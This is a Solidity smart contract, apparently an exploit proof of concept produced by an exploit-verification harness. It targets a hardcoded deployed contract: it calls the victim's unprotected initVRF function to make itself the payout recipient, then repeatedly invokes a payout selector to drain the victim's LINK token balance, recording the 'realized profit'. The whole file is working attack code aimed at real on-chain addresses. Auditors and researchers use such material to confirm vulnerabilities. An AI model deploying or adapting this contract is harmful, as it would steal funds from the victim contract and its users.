// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IVictimLike {
    function initVRF(address recipient, address token) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xF340bd3eB3E82994CfF5B8C3493245EDbcE63436;
    address public constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;

    bytes4 internal constant PAYOUT_SELECTOR = 0x607d60e6;
    uint256 internal constant PAYOUT_ARG = 0;
    uint256 internal constant MAX_PAYOUT_CALLS = 80;

    bool public executed;
    bool public initSucceeded;
    bool public downstreamCallObserved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    uint256 public payoutCallsAttempted;
    uint256 public payoutCallsSucceeded;
    uint256 public startingVictimLinkBalance;
    uint256 public finalVictimLinkBalance;
    uint256 public startingAttackerLinkBalance;
    uint256 public finalAttackerLinkBalance;
    uint256 internal realizedProfit;

    bytes public lastInitRevertData;
    bytes public lastPayoutRevertData;
    bytes public lastCallbackData;

    constructor() {}

    function profitToken() external pure returns (address) {
        return LINK;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function executeOnOpportunity() external {
        _execute();
    }

    function execute() external {
        _execute();
    }

    function run() external {
        _execute();
    }

    function exploit() external {
        _execute();
    }

    function _execute() internal {
        if (executed) {
            return;
        }
        executed = true;

        IERC20Like link = IERC20Like(LINK);
        IVictimLike victim = IVictimLike(TARGET);
        address attacker = address(this);

        startingAttackerLinkBalance = link.balanceOf(attacker);
        startingVictimLinkBalance = link.balanceOf(TARGET);

        // Exploit path stage 1:
        // Call initVRF(attacker, LINK) from an arbitrary external context.
        try victim.initVRF(attacker, LINK) {
            initSucceeded = true;
        } catch (bytes memory reason) {
            lastInitRevertData = reason;
            _finalize(link);
            return;
        }

        // Exploit path stage 2:
        // Invoke the same downstream payout selector repeatedly so the victim sends LINK
        // to the attacker-controlled recipient configured above.
        //
        // No flashswap funding is introduced here because the trace proves the payout path
        // already transfers victim-held LINK directly; the observed failure was caused by
        // this receiver contract not accepting LINK's ERC677 transferAndCall callback.
        uint256 previousAttackerBalance = startingAttackerLinkBalance;
        uint256 previousVictimBalance = startingVictimLinkBalance;

        for (uint256 i = 0; i < MAX_PAYOUT_CALLS; ++i) {
            payoutCallsAttempted = i + 1;

            (bool success, bytes memory returndata) = TARGET.call(
                abi.encodeWithSelector(PAYOUT_SELECTOR, PAYOUT_ARG)
            );

            if (!success) {
                lastPayoutRevertData = returndata;
                break;
            }

            payoutCallsSucceeded = i + 1;
            downstreamCallObserved = true;

            uint256 attackerBalanceNow = link.balanceOf(attacker);
            uint256 victimBalanceNow = link.balanceOf(TARGET);

            if (attackerBalanceNow > previousAttackerBalance) {
                previousAttackerBalance = attackerBalanceNow;
                previousVictimBalance = victimBalanceNow;
            } else if (victimBalanceNow == previousVictimBalance) {
                break;
            } else {
                previousVictimBalance = victimBalanceNow;
            }

            if (victimBalanceNow == 0) {
                break;
            }
        }

        _finalize(link);
    }

    function _finalize(IERC20Like link) internal {
        finalAttackerLinkBalance = link.balanceOf(address(this));
        finalVictimLinkBalance = link.balanceOf(TARGET);

        if (finalAttackerLinkBalance > startingAttackerLinkBalance) {
            realizedProfit = finalAttackerLinkBalance - startingAttackerLinkBalance;
        }

        hypothesisValidated = initSucceeded && downstreamCallObserved && realizedProfit > 0;
        hypothesisRefuted = !hypothesisValidated;
    }

    function onTokenTransfer(address sender, uint256 amount, bytes calldata data) external {
        require(msg.sender == LINK, "unexpected token callback");
        lastCallbackData = abi.encode(sender, amount, data);
    }

    fallback() external payable {}

    receive() external payable {}
}
